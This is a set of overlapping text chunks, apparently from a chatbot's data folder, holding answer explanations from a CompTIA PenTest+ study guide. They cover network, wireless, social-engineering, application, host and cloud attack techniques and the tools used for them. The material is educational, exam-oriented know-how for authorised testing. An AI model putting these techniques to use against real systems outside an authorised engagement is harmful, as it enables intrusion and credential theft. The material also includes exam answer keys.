rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	a SSH tunnel to a previously unknown system. Sending via HTTP instead of HTTPS will make inspection of the outbound, unencoded data trivial for defenders, and hashing the data will not leave it in a recoverable state when it arrives. 10. C. A combination of fileless malware and living‐off‐the‐land techniques that use native tools and utilities will help Ian to ensure that he meets the rules of engagement of the penetration test he is conducting. Even cleaning up files will violate those rules, meaning that Ian should not add tools even if he is confident in his ability to clean them up after he is done. A Metasploit dropper leaves files behind, which means both answers that use this do not meet the requirements. 11. B. Tina may want to try a brute‐force dictionary attack to test for weak passwords. She should build a custom dictionary for her target organization, and she may want to do some social engineering work or social media assessment up front to help her identify any common password selection behaviors that members of the organization tend to display. 12. C. PSRemote, or PowerShell Remote, provides command‐line access from remote systems. Once you have established a remote trust relationship using valid credentials, you can use PowerShell commands for a variety of exploit and information‐gathering activities, including use of dedicated PowerShell exploit tools. 13. A. The Windows Task Scheduler is used for scheduled tasks. On Linux, cron jobs are set to start applications and other events on time. Other common means of creating persistent access to Linux systems include modifying system daemons, replacing services with Trojaned versions, or even simply creating user accounts for later use. 14. D. Metasploit needs to know the remote target host, known as rhost, and this was not set. Tim can set it by typing set rhost [ip address] with the proper IP address. Some payloads require lhost, or local host, to be set as well, making it a good idea to use the show options command before running an exploit. 15. B. Cameron has enabled PowerShell remote access, known as PSRemoting, and has configured it to allow unencrypted sessions using basic auth. This configuration should worry any Windows administrator who finds it! 16. A. Although it may seem odd, exploiting information‐gathering exploits early can help provide useful information for other exploits. In addition, most information‐gathering exploits leave very little evidence and can provide information on service configurations and user accounts, making them a very useful tool in a situation like the scenario described. 17. B. Annie is using a password spraying attack, which uses the same password against a variety of accounts, then tries the next password in a series, continuing through each password in its list for all the targeted accounts. Firehose and cloned password attacks were made up for this question, and pass‐the‐hash attacks use captured hashes to attempt to use existing sessions. 18. C. Metasploit's SMB capture mode, Responder, and Wireshark can all capture SMB hashes from broadcasts.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	can provide information on service configurations and user accounts, making them a very useful tool in a situation like the scenario described. 17. B. Annie is using a password spraying attack, which uses the same password against a variety of accounts, then tries the next password in a series, continuing through each password in its list for all the targeted accounts. Firehose and cloned password attacks were made up for this question, and pass‐the‐hash attacks use captured hashes to attempt to use existing sessions. 18. C. Metasploit's SMB capture mode, Responder, and Wireshark can all capture SMB hashes from broadcasts. Impacket doesn't build this capability in but provides a wide range of related tools, including the ability to authenticate with hashes once you have captured them. If you're wondering about encountering this type of question on the exam, remember to eliminate the answers you are sure of to reduce the number of remaining options. Here, you can likely guess that Metasploit has a module for this, and Wireshark is a packet capture tool, so capturing broadcast traffic may require work but would be possible. Now you're down to a 50/50 chance! 19. A. BloodHound ingests Active Directory forest or tree data and displays, allowing pentesters to visualize the data and analyze it by looking for elements like privileged accounts. It does not capture encrypted network traffic, visualize network flows, or search for encrypted files on shared drives. 20. C. PCI‐DSS network segmentation assessments typically focus on ensuring that traffic cannot go from a lower‐security segment to a higher‐security segment. Thus, Ben will be validating firewall rules preventing this. Trunking at the ISP connection and physical segmentation testing are not common tests for this type of engagement, and antimalware tools are more likely to search for malware than to apply differing rules between network segments. Chapter 7: Exploiting Network Vulnerabilities 1. B. Kismet is specifically designed to act as a wireless IDS in addition to its other wireless packet capture features. WiFite is designed for wireless network auditing. Aircrack‐ng provides a variety of attack tools in addition to its capture and injection capabilities for wireless traffic. SnortiFi was made up for this question. 2. C. If the NAC system relies only on MAC filtering, Chris only needs to determine the hardware address of a trusted system. This may be accessible simply by looking at a label on a laptop or desktop, or he may be able to obtain it via social engineering or technical methods. 3. A. Aircrack‐ng has fake‐AP functionality built in, with tools that will allow Chris to identify valid access points, clone them, disassociate a target system, and then allow on‐path attacks. 4. A. Chris can use ARP spoofing to represent his workstation as a legitimate system that other devices are attempting to connect to. As long as his responses are faster, he will then receive traffic and can conduct on‐path attacks. Network sniffing is useful after this to read traffic, but it isn't useful for most traffic
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	or he may be able to obtain it via social engineering or technical methods. 3. A. Aircrack‐ng has fake‐AP functionality built in, with tools that will allow Chris to identify valid access points, clone them, disassociate a target system, and then allow on‐path attacks. 4. A. Chris can use ARP spoofing to represent his workstation as a legitimate system that other devices are attempting to connect to. As long as his responses are faster, he will then receive traffic and can conduct on‐path attacks. Network sniffing is useful after this to read traffic, but it isn't useful for most traffic on its own on a switched network. SYN floods are not useful for gaining credentials; thus, both options C and D are incorrect. 5. D. Switch spoofing relies on a switch interface that is configured as either dynamic desirable, dynamic auto, or trunk mode, allowing an attacker to generate dynamic trunk protocol messages. The attacker can then access traffic from all VLANs. 6. C. Bluejacking is an attack technique that attempts to send unsolicited messages via Bluetooth. Bluesnarfing attempts to steal information, whereas bluesniping is a term for long‐distance Bluetooth attacks. Bluesending is not a common term used for Bluetooth attacks as of this writing. 7. B. Pixie dust attacks use brute force to identify the key for vulnerable WPS‐enabled routers due to poor key selection practices. The other options are made up. 8. C. NFC communications occur at a very short range that allows a “tap” to occur. That means that Michelle will need to put a capture device very close to the communications or that she needs specialized capabilities to try to capture the traffic at longer distances. Encryption can make it difficult to read the traffic, but it won't stop interception. Duration of the transmission and protocol version could potentially add complexity, but the key thing to remember is that NFC is a very short ranged protocol. 9. D. Mariana is conducting a password spraying attack. Password spraying attacks use the same credentials against many systems, then try the next credential pairing. Hash cracking attempts to identify the original password that resulted in a given captured hash. Dictionary attacks use a word list along with a set of rules to modify those words to attempt a brute‐force attack. A brute‐force attack involves repeated tries using an algorithm or process to attempt to log in. When a question like this has multiple potentially correct answers, remember to answer with the most specific answer rather than a broad answer. 10. A. FTP is an unencrypted protocol, which means that Steve can simply capture FTP traffic the next time a user logs into the FTP server from the target system. A brute‐force attack may succeed, but it's more likely to be noticed. Although an exploit may exist, the question does not mention it, and even if it does exist it will not necessarily provide credentials. Finally, downgrade attacks are not useful against FTP servers. 11. C. Netcat is the only
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	like this has multiple potentially correct answers, remember to answer with the most specific answer rather than a broad answer. 10. A. FTP is an unencrypted protocol, which means that Steve can simply capture FTP traffic the next time a user logs into the FTP server from the target system. A brute‐force attack may succeed, but it's more likely to be noticed. Although an exploit may exist, the question does not mention it, and even if it does exist it will not necessarily provide credentials. Finally, downgrade attacks are not useful against FTP servers. 11. C. Netcat is the only tool from this list that can be used as a reverse shell. It can also be used for basic port scanning and a variety of other network attacks and testing purposes. Aircrack‐ng is used for network penetration testing, nmap is a port scanner, and Censys is a search engine that can be used for open‐source intelligence work. 12. A. Deauthenticating a system will result in reauthentication, creating the possibility of capturing handshakes from a target. Bluejacking, network stress testing, and RFID cloning attacks do not rely on deauthentication. 13. B. Unlike the other options listed here, Mimikatz pulls hashes from the Local Security Authority Subsystem Service (LSASS) process. Since the question specifically notes “over the wire,” Mimikatz is the only tool that cannot be used for that. 14. C. All of these tools are denial‐of‐service tools. Although some of them have been used for DDoS attacks, they are not DDoS tools on their own. 15. D. Mike is using nested tags inside a packet to attempt to hop VLANs. If he is successful, his packets will be delivered to the target system, but he will not see any response. 16. C. Sending FIN and ACK while impersonating the target workstation will cause the connection to close. This will cause the target to attempt to establish a less secure connection if supported. 17. A, D. To fully execute an on‐path attack, Isaac needs to spoof both the server and the target so that they each think that his PC is the system they are sending to. Spoofing the gateway (10.0.1.1) or the broadcast address (255.255.255.255) will not serve his purposes. 18. B. The Windows net commands can display a wealth of information about a local domain, and the password policy can be reviewed by using the net accounts /domain command. 19. B. Cynthia's response needs to arrive before the legitimate DNS server. If her timing isn't right, the legitimate response will be accepted. 20. A. Low‐frequency RFID cards are often used for entry access cards, and are easily cloned using inexpensive commodity cloning devices. Medium‐frequency cards in the 400 to 451 KHz range do not exist, whereas high‐frequency cards are more likely to be cloned using a phone's NFC capability. Ultra‐high‐frequency cards are less standardized, making cloning more complex. Chapter 8: Exploiting Physical and Social Vulnerabilities 1. C. Whaling is a specialized form of phishing that targets important leaders and senior
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	B. Cynthia's response needs to arrive before the legitimate DNS server. If her timing isn't right, the legitimate response will be accepted. 20. A. Low‐frequency RFID cards are often used for entry access cards, and are easily cloned using inexpensive commodity cloning devices. Medium‐frequency cards in the 400 to 451 KHz range do not exist, whereas high‐frequency cards are more likely to be cloned using a phone's NFC capability. Ultra‐high‐frequency cards are less standardized, making cloning more complex. Chapter 8: Exploiting Physical and Social Vulnerabilities 1. C. Whaling is a specialized form of phishing that targets important leaders and senior staff. If Cynthia was specifically targeting individuals, it would be spear phishing. Smishing uses SMS messages, and VIPhishing was made up for this question. 2. B. A security vestibule allows only one individual through at a time, with doors at either end that unlock and open one at a time. It will prevent most piggybacking or tailgating behavior unless employees are willfully negligent. 3. D. Most organizations continue to use RFID or magnetic‐stripe technology for entry access cards, making a pentester's job easier, since both technologies can be cloned. Smartcards are far more difficult to clone if implemented properly. 4. A. Jen is impersonating an administrative assistant. Interrogation techniques are more aggressive and run the risk of making the target defensive or aware they are being interrogated. Shoulder surfing is the process of looking over a person's shoulder to acquire information, and administrivia isn't a penetration testing term. 5. B. The Browser Exploitation Framework (BeEF) is specifically designed for this type of attack. Jen can use it to easily deploy browser exploit tools to a malicious website and can then use various phishing and social engineering techniques to get Flamingo employees to visit the site. 6. B. Jen should use the Infectious Media Generator tool, which is designed to create thumb drives and other media that can be dropped on‐site for employees to pick up. The Teensy USB HID attack module may be a tempting answer, but it is designed to make a Teensy (a tiny computer much like an Arduino) act like a keyboard or other human interface device rather than to create infected media. Creating a website attack or a mass mailer attack isn't part of a USB key drop. 7. B. Chris is conducting a spear phishing attack. Spear phishing attacks target specific individuals. If Chris was targeting a group of important individuals, this might be a whaling attack instead. CEO baiting, phish hooking, and Hook SETting were all made up for this question. 8. C. Frank has encountered a vishing attack, a type of attack conducted via phone that often relies on a perception of authority and urgency to acquire information from its targets. A spear phishing attack targets specific individuals or groups, and whaling attacks are aimed at VIPs —neither of which is indicated in the question. The attack is via voice, not SMS, ruling that option out, too. 9. D. Emily can try dumpster
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	targeting a group of important individuals, this might be a whaling attack instead. CEO baiting, phish hooking, and Hook SETting were all made up for this question. 8. C. Frank has encountered a vishing attack, a type of attack conducted via phone that often relies on a perception of authority and urgency to acquire information from its targets. A spear phishing attack targets specific individuals or groups, and whaling attacks are aimed at VIPs —neither of which is indicated in the question. The attack is via voice, not SMS, ruling that option out, too. 9. D. Emily can try dumpster diving. An organization's trash can be a treasure trove of information about the organization, its staff, and its current operations based on the documents and files that are thrown away. She might even discover entire PCs or discarded media! 10. D. Spear phishing is targeted to specific populations, in this case, administrative assistants. Whaling targets VIPs, vishing is done via phone calls, and a watering hole attack leverages a frequently visited site or application. 11. C. Social proof relies on persuading an individual that they can behave in a way similar to what they believe others have. A social proof scenario might involve explaining to the target that sharing passwords was commonly done among employees in a specific circumstance or that it was common practice to let other staff in through a secure door without an ID. 12. C. RFID badges are wireless and can sometimes be cloned from distances up to a few feet away. Magstripe cards need to be read with a magnetic‐stripe reader, smartcards provide additional security that make them difficult to clone, and CAC cards are the U.S. government's smartcard implementation. 13. B. Allan is using a pretext to gain access to the organization. Claiming to be a delivery person who needs a specific signature may get him past the initial security for the organization. He is not claiming particular authority, providing social proof that others allow him in, or claiming he is similar to the security person or receptionist. 14. A. Scarcity can be a powerful motivator when performing a social engineering attempt. The email that Charles sent will use the limited number of cash prizes to motivate respondents. If he had added “the first five,” he would have also targeted urgency, which is often paired with scarcity to provide additional motivation. 15. C. A quid pro quo attempt relies on the social engineer offering something of perceived value so that the target will feel indebted to them. The target is then asked to perform an action or otherwise do what the pentester wants them to do. 16. D. Andrew has used a watering hole attack, but he has also made what might be a critical mistake. Placing malware on a third‐party site accessed by many in the local area (or beyond!) is probably beyond the scope of his engagement and is likely illegal. A better plan would have been to target a resource owned
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	quid pro quo attempt relies on the social engineer offering something of perceived value so that the target will feel indebted to them. The target is then asked to perform an action or otherwise do what the pentester wants them to do. 16. D. Andrew has used a watering hole attack, but he has also made what might be a critical mistake. Placing malware on a third‐party site accessed by many in the local area (or beyond!) is probably beyond the scope of his engagement and is likely illegal. A better plan would have been to target a resource owned and operated by the company itself and accessed only by internal staff members. 17. C. Once a pentester is caught, their first response should be to provide their pretext. A successful social engineering attempt at this point can salvage the penetration test attempt. If that doesn't work, calling the organizational contact for a “get out of jail free” response may be the only option in a difficult situation. 18. A. USB key drops are sometimes referred to as physical honeypots. They tempt staff to plug unknown devices into their computers, which a well‐trained and suspicious staff shouldn't do. The remaining options were made up for this question. 19. B. Susan is using the concept of reciprocation to persuade the employee that they should perform an action that benefits her, since she has done them a favor. 20. C. Shoulder surfing takes many forms, including watching as an employee types in an entry access code. Setec Astronomy is a reference to the excellent hacking movie Sneakers, and both code surveillance and keypad capture were made up for this question. Chapter 9: Exploiting Application Vulnerabilities 1. B. Input allowlisting approaches define the specific input type or range that users may provide. When developers can write clear business rules defining allowable user input, allowlisting is definitely the most effective way to prevent injection attacks. 2. D. Web application firewalls must be placed in front of web servers. This rules out location C as an option. The next consideration is placing the WAF so that it can filter all traffic headed for the web server but where it sees a minimum amount of extraneous traffic. This makes location D the best option for placing a WAF. 3. A. The use of the SQL command is a signature characteristic of a timing‐based SQL injection attack. 4. A. The system() function executes a command string against the operating system from within an application and may be used in command injection attacks. 5. D. Penetration testers may use a wide variety of sources when seeking to gain access to individual user accounts. These may include conducting social engineering attacks against individual users, obtaining password dumps from previously compromised sites, obtaining default account lists, and conducting password cracking attacks. 6. B. TGTs are incredibly valuable and can be created with extended life spans. When attackers succeed in acquiring TGTs, the TGTs are often called “golden tickets” because they
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	4. A. The system() function executes a command string against the operating system from within an application and may be used in command injection attacks. 5. D. Penetration testers may use a wide variety of sources when seeking to gain access to individual user accounts. These may include conducting social engineering attacks against individual users, obtaining password dumps from previously compromised sites, obtaining default account lists, and conducting password cracking attacks. 6. B. TGTs are incredibly valuable and can be created with extended life spans. When attackers succeed in acquiring TGTs, the TGTs are often called “golden tickets” because they allow complete access to the Kerberos‐connected systems, including creation of new tickets, account changes, and even falsification of accounts or services. 7. B. Websites use cookies to maintain sessions over time. If Wendy is able to obtain a copy of the user's session cookie, she can use that cookie to impersonate the user's browser and hijack the authenticated session. 8. D. Unvalidated redirects instruct a web application to direct users to an arbitrary site at the conclusion of their transaction. This approach is quite dangerous because it allows an attacker to send users to a malicious site through a legitimate site that they trust. Sherry should restrict redirects so that they occur only within her trusted domain(s). 9. C. This query string is indicative of a parameter pollution attack. In this case, it appears that the attacker was waging a SQL injection attack and tried to use parameter pollution to slip the attack past content filtering technology. The two instances of the parameter in the query string indicate a parameter pollution attempt. 10. A. The series of thousands of requests incrementing a variable indicate that the attacker was most likely attempting to exploit an insecure direct object reference vulnerability. 11. C. In this case, the operators are the telltale giveaway that the attacker was attempting to conduct a directory traversal attack. This particular attack sought to break out of the web server's root directory and access the file on the server. 12. C. XSRF attacks work by making the reasonable assumption that users are often logged into many different websites at the same time. Attackers then embed code in one website that sends a command to a second website. 13. D. DOM‐based XSS attacks hide the attack code within the Document Object Model. This code would not be visible to someone viewing the HTML source of the page. Other XSS attacks would leave visible traces in the browser. 14. C. The time‐of‐check‐to‐time‐of‐use (TOCTTOU or TOC/TOU) issue is a race condition that occurs when a program checks access permissions too far in advance of a resource request. 15. A. Code signing provides developers with a way to confirm the authenticity of their code to end users. Developers use a cryptographic function to digitally sign their code with their own private key, and then browsers can use the developer's public key to verify that signature and ensure that the code is legitimate
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	someone viewing the HTML source of the page. Other XSS attacks would leave visible traces in the browser. 14. C. The time‐of‐check‐to‐time‐of‐use (TOCTTOU or TOC/TOU) issue is a race condition that occurs when a program checks access permissions too far in advance of a resource request. 15. A. Code signing provides developers with a way to confirm the authenticity of their code to end users. Developers use a cryptographic function to digitally sign their code with their own private key, and then browsers can use the developer's public key to verify that signature and ensure that the code is legitimate and was not modified by unauthorized individuals. 16. A. Postman is the best tool for Shahla's needs because it is specifically designed for sending, manipulating, and testing API requests. It offers a user‐friendly interface and extensive features tailored for API development and testing. DirBuster is primarily used for brute‐forcing directories and files on web servers, not for API testing. Gobuster is also a tool for directory and file brute‐forcing, making it unsuitable for Shahla's requirements. Wfuzz is focused on web application security testing, particularly fuzzing for vulnerabilities, and is not designed for API request manipulation or testing. 17. B. ZAP (Zed Attack Proxy) is the best tool for Norm because it allows him to intercept and manipulate HTTP requests before they leave his browser. This makes it ideal for testing how web applications handle different inputs during a penetration test. Wfuzz is designed for brute‐ forcing web applications, not for intercepting and modifying requests. Gobuster focuses on directory and file brute‐forcing, so it doesn't offer the capability Norm needs. WPScan is specifically for scanning WordPress sites for vulnerabilities and lacks the functionality to manipulate input in real time. 18. A. API use may be restricted by assigning legitimate users unique API keys that grant them access, subject to their own authorization constraints and bandwidth limitations. 19. B. TruffleHog is the best tool to help Renee identify any other similar disclosures because it is specifically designed to search for secrets, like API keys, in Git repositories. It scans through the entire commit history to detect sensitive information that may have been accidentally committed. ZAP is a security tool primarily used for finding vulnerabilities in web applications, not for scanning repositories for secrets. Gobuster is focused on directory and file brute‐forcing rather than searching for exposed secrets. Sqlmap is a tool for detecting and exploiting SQL injection vulnerabilities, which is unrelated to finding exposed API keys in repositories. 20. C. This URL contains the address of a local file passed to a web application as an argument. It is most likely a local file inclusion exploit, attempting to execute a malicious file that the testers previously uploaded to the server. Chapter 10: Exploiting Host Vulnerabilities 1. B. The Customer Wordlist Generator, or CeWL, is a tool designed to spider a website and then build a word list using the files and web pages that it finds. The word list can then be
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	detecting and exploiting SQL injection vulnerabilities, which is unrelated to finding exposed API keys in repositories. 20. C. This URL contains the address of a local file passed to a web application as an argument. It is most likely a local file inclusion exploit, attempting to execute a malicious file that the testers previously uploaded to the server. Chapter 10: Exploiting Host Vulnerabilities 1. B. The Customer Wordlist Generator, or CeWL, is a tool designed to spider a website and then build a word list using the files and web pages that it finds. The word list can then be used to help with password cracking. 2. B. The most practical answer is to compromise the administrative interface for the underlying hypervisor. Although VM escape would be a useful tool, very few VM escape exploits have been discovered, and each has been quickly patched. That means that pentesters can't rely on one being available and unpatched when they encounter a VM host and should instead target administrative rights and access methods. 3. B. Jeff is preparing a direct‐to‐origin attack, which targets the underlying system or resource behind a load balancer, CDN, or other similar system. If he can create a denial‐of‐service condition, the front‐ end network or systems will not have the ability to get updates or data from it, allowing him to bypass the protections and resilience a load balancer or content delivery network provides. A side‐channel attack in most cloud environments will focus on taking advantage of being on the same physical hardware. Federation misconfiguration attacks attempt to take advantage of an insecure configuration in the federation linkages between two organizations, and metadata service attacks leverage native services provided by cloud providers intended to allow easy queries about systems and running inside their environment such as hostnames, IP addresses, or other metadata about the instances. 4. C. Although IoT devices may leak data due to the use of insecure protocols or data storage, that's a concern for the defender. Pentesters should actively be looking for that sort of opportunity! Claire knows that IoT devices may fail when scanned or compromised, and that this can cause issues. They may also be part of a fragile environment that may not be designed to handle scans, or where delayed responses or downtime may cause issues for her client. She also knows that data corruption may occur if devices are not behaving properly due to a penetration test and that in environments where IoT data is critical that this could be a real issue. Claire should carefully discuss this with her client and ensure that they understand the risks and how to constrain them if testing IoT devices is important to the pentest. 5. D. The Web Application Attack and Audit Framework (w3af) is a web application testing and exploit tool that can spider the site and test applications and other security issues that may exist there. The Paros proxy is an excellent web proxy tool often used by web application testers,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	properly due to a penetration test and that in environments where IoT data is critical that this could be a real issue. Claire should carefully discuss this with her client and ensure that they understand the risks and how to constrain them if testing IoT devices is important to the pentest. 5. D. The Web Application Attack and Audit Framework (w3af) is a web application testing and exploit tool that can spider the site and test applications and other security issues that may exist there. The Paros proxy is an excellent web proxy tool often used by web application testers, but it isn't a full‐fledged testing suite like w3af. CUSpider and other versions of Spider are tools used to find sensitive data on systems, and Patator is a brute‐force tool. 6. B. Field devices are controlled by remote terminal units (RTUs) or programmable logic controllers (PLCs), which are likely to connect to a network and accept commands from a master station or operator station. Field devices are often controlled via digital or analog commands from the RTUs and PLCs, and are thus not likely to use protocols or access methods that are supported by normal penetration testing tools. 7. D. Attacking the underlying cloud hosting provider's containerization service is typically prohibited by terms of service from the provider and is thus unlikely to be part of the scope for a penetration test of a cloud‐hosted containerization service. The application running in the container, the APIs used by the containers, and databases they access are more likely to be part of the engagement. 8. B. If Jocelyn wants to successfully cause a denial‐of‐service condition, her best bet is a direct‐to‐origin attack. Exhausting the resources for the source or origin server for the service is far more likely to be successful than attempting to take on the resources of a cloud‐hosted content delivery network. BLE attacks are used against devices that use Bluetooth's low energy mode. IPMI is a set of interface specifications for remote management and monitoring for computer systems and isn't typically a target for a resource exhaustion attack. A VM escape attack might be useful if Jocelyn had already compromised a host and wanted to gain further access, but again it isn't a useful way to attack a service like the one that is described. 9. B. Brute‐forcing multifactor is the only item on this list that is not a common method of attempting to gain access to a cloud environment. Multifactor authentication is designed to be resistant to brute force, meaning that other means would be necessary to access an account that uses it. 10. C. Charleen could place the device image in a controlled sandbox and make passcode attempts against it, resetting the device each time it wipes itself, allowing her to make many attempts. She could also run many copies in parallel to allow even faster brute‐force attempts. Reverse engineering is used to analyze binaries and code and does not suit this purpose. Containerization is used
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	a common method of attempting to gain access to a cloud environment. Multifactor authentication is designed to be resistant to brute force, meaning that other means would be necessary to access an account that uses it. 10. C. Charleen could place the device image in a controlled sandbox and make passcode attempts against it, resetting the device each time it wipes itself, allowing her to make many attempts. She could also run many copies in parallel to allow even faster brute‐force attempts. Reverse engineering is used to analyze binaries and code and does not suit this purpose. Containerization is used to place applications in a virtualized environment, and rainbow tables are used to attack hashed passwords and aren't useful for this purpose, either. 11. A. Persuading a user to add an additional certificate to the system or device's certificate store is the only option from this list that will help to defeat certificate pinning. Reverse engineering might be useful to determine what system is pinned if the certificate store isn't available and the application is. Object storage security issues may provide access to data or a place to drop data, but there's nothing in the question to indicate that this would be a viable solution, and data exfiltration is a term that describes getting data out of an organization. 12. B. MobSF is the only tool listed that provides static code analysis capabilities. Objection and Frida are used for JavaScript and library injection, and Burp Suite is an application testing suite. 13. A. Pacu is a dedicated AWS exploitation and penetration testing framework. Cloud Custodian is a useful management tool that can be used to identify misconfigurations, CloudBrute is a cloud enumeration tool, and BashAWS was made up for this question. 14. C. Side‐channel attacks attempt to gain information about other systems by gathering data from an underlying system or infrastructure rather than directly from the running virtual system itself. Direct‐to‐ origin attacks attempt to identify the source system that powers a content delivery network or other scaling service to allow denial‐of‐ service or resource exhaustion attacks to apply to a smaller, less capable target. Watering hole attacks are a social engineering attack that leverages a frequently used website to host malware as part of an attack. An object storage attack focuses on services like S3 in AWS and often looks for improperly set permissions or other flaws that can be leveraged. 15. A. One of the simplest techniques to validate if a bucket is accessible is to simply navigate to the bucket's URL. If it provides a file listing, the bucket is not configured securely. APKX is an Android APK extractor tool. Fuzzers are used for software testing, not for bucket security testing, and direct‐to‐origin attacks attempt to bypass content delivery networks, load balancers, and similar tools to allow attacks directly against source systems for denial‐of‐service or resource exhaustion attacks. 16. C. Credential harvesting can take many forms, but one of the most common options is to use a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	be leveraged. 15. A. One of the simplest techniques to validate if a bucket is accessible is to simply navigate to the bucket's URL. If it provides a file listing, the bucket is not configured securely. APKX is an Android APK extractor tool. Fuzzers are used for software testing, not for bucket security testing, and direct‐to‐origin attacks attempt to bypass content delivery networks, load balancers, and similar tools to allow attacks directly against source systems for denial‐of‐service or resource exhaustion attacks. 16. C. Credential harvesting can take many forms, but one of the most common options is to use a phishing attack to obtain credentials that can be used to access accounts and systems belonging to a target organization. Simply conducting vulnerability scanning will not result in credentials being obtained, capturing data from other systems on a shared underlying system is a side‐channel attack and is unlikely to result in acquiring credentials, and SDKs may provide some useful information but are unlikely to directly provide credentials. 17. B. Most organizations recognize that IPMI interfaces need additional protection and place them on a private VLAN in their data center. Additional access controls like VPN requirements or bastion hosts are also commonly used. IPMI interfaces should not be exposed in a DMZ or a workstation VLAN, let alone on a Wi‐Fi network! 18. D. Patator, Hydra, and Medusa are all useful brute‐forcing tools. Minotaur may be a great name for a penetration testing tool, but the authors of this book aren't aware of any tool named Minotaur that is used by pentesters! 19. C. Cameron has set up a bind shell, which connects a shell to a service port. A reverse shell would have initiated a connection from the compromised host to his penetration testing workstation (or another system Cameron has access to). The question does not provide enough information to determine if the shell might be a root shell, and blind shell is not a common penetration testing term. 20. C. Hashcat would be the fastest when taking advantage of a powerful graphic card, and John the Ripper will typically be the slowest of the password cracking methods listed. CeWL is a word list or dictionary generator and isn't a password cracker, and Rainbow Road is not a penetration testing tool. Chapter 11: Reporting and Communication 1. D. An attestation of findings is a certification provided by the penetration testers to document that they conducted a test and the results for compliance purposes. 2. A. The Local Administrator Password Solution (LAPS) tool from Microsoft provides a method for randomizing local administrator account credentials through integration with Active Directory. 3. C. The three common triggers for communication during a penetration test are the completion of a testing stage, the discovery of a critical finding, and the identification of indicators of prior compromise. 4. B. The only conclusion that Gary can draw from this information is that the server is offering unnecessary services because it is listening for SSH connections when it should
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	document that they conducted a test and the results for compliance purposes. 2. A. The Local Administrator Password Solution (LAPS) tool from Microsoft provides a method for randomizing local administrator account credentials through integration with Active Directory. 3. C. The three common triggers for communication during a penetration test are the completion of a testing stage, the discovery of a critical finding, and the identification of indicators of prior compromise. 4. B. The only conclusion that Gary can draw from this information is that the server is offering unnecessary services because it is listening for SSH connections when it should not be supporting that service. 5. C. Passphrases, security questions, and PINs are all examples of knowledge‐based authentication and would not provide multifactor authentication when paired with a password, another knowledge‐based factor. Smartphone apps are an example of “something you have” and are an acceptable alternative. 6. D. An executive summary should be written in a manner that makes it accessible to the layperson. It should not contain technical detail. 7. A. Vulnerability remediation is a follow‐up activity and is not conducted as part of the test. The testers should, however, remove any shells or other tools installed during testing as well as remove any accounts or credentials that they created. 8. C. The most effective way to conduct a lessons learned session is to ask a neutral third party to serve as the facilitator, allowing everyone to express their opinions freely. 9. C. Network segmentation is an example of a technical control. Time‐ of‐day restrictions, job rotation, and user training are all examples of operational controls. 10. A. Input sanitization (also known as input validation) and parameterized queries are both acceptable means for preventing SQL injection attacks. Network firewalls generally would not prevent such an attack. 11. B. System hardening should take place when a system is initially built and periodically during its life. There is no need to harden a system prior to decommissioning because it is being shut down at that point. 12. B. Biometric authentication techniques use a measurement of some physical characteristic of the user, such as a fingerprint scan, facial recognition, or voice analysis. Chapter 12: Scripting for Penetration Testing 1. D. PowerShell interpreters are available on all major platforms, including Windows, macOS, and many popular Linux variants. 2. C. PowerView is the correct module for network situational awareness in an Active Directory (AD) environment, allowing penetration testers to enumerate domain users, groups, and permissions. It is designed specifically for gathering information about AD environments. PowerUpSQL is focused on SQL Server exploitation and does not provide AD enumeration capabilities. Empire is a post‐exploitation framework but not a PowerShell module specifically for Active Directory enumeration. PowerSploit is a toolkit for various exploitation tasks, including privilege escalation and code execution, but it isn't dedicated to network situational awareness in AD. 3. B. As you prepare for the exam, you should be able to identify the programming language used in code snippets. The Write‐Host command is used
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	environment, allowing penetration testers to enumerate domain users, groups, and permissions. It is designed specifically for gathering information about AD environments. PowerUpSQL is focused on SQL Server exploitation and does not provide AD enumeration capabilities. Empire is a post‐exploitation framework but not a PowerShell module specifically for Active Directory enumeration. PowerSploit is a toolkit for various exploitation tasks, including privilege escalation and code execution, but it isn't dedicated to network situational awareness in AD. 3. B. As you prepare for the exam, you should be able to identify the programming language used in code snippets. The Write‐Host command is used to generate output in PowerShell. 4. D. Python is a general‐purpose programming language. It is an interpreted language that uses scripts, rather than a compiled language that uses source code to generate executable files. 5. D. You must set the user (owner) bit to execute (x) to allow the execution of a Bash script. The chmod u+x command performs this task. 6. C. The RemoteSigned policy allows the execution of any PowerShell script that you write on the local machine but requires that scripts downloaded from the Internet be signed by a trusted publisher. 7. A. PowerShell requires the use of the $ before an array name in an assignment operation. The elements of the array are then provided as a comma‐separated list. Option B would work in Bash, and option C would work in Python. 8. C. The == operator tests for equality in Python. The != operator tests for inequality in Python. The ‐eq operator tests for equality in Bash and PowerShell, and the ‐ne operator tests for inequality in those languages. 9. A. The %20 value is used to URL‐encode spaces using the percent encoding scheme. 10. C. Infection Monkey is the tool that simulates malware infections by attempting to spread throughout a network, testing the security of data centers and cloud environments. It is designed to identify potential vulnerabilities by mimicking the behavior of real‐world attacks. Atomic Red Team provides individual tests for specific attack techniques rather than simulating widespread infections. PowerView is used for network situational awareness and enumeration in Active Directory environments, not for malware simulation. Caldera is an automated adversary emulation system, but it focuses more on simulating tactics and techniques rather than network infection spreading. 11. B. Bash and PowerShell allow the direct concatenation of strings and numeric values. Python requires the explicit conversion of numeric values to strings prior to concatenation. 12. D. There is no limit to the number of elif clauses that may be included in a Bash script. 13. B. When using conditional execution, only one clause is executed. In this case, the code following the if clause will execute, making it impossible for the elif or else clause to execute. 14. B. Use the flowchart in Figure 12.3 to answer this question. The code contains a Do statement, so it is written in PowerShell. 15. D. Use the flowchart in Figure 12.1 to answer this question. The
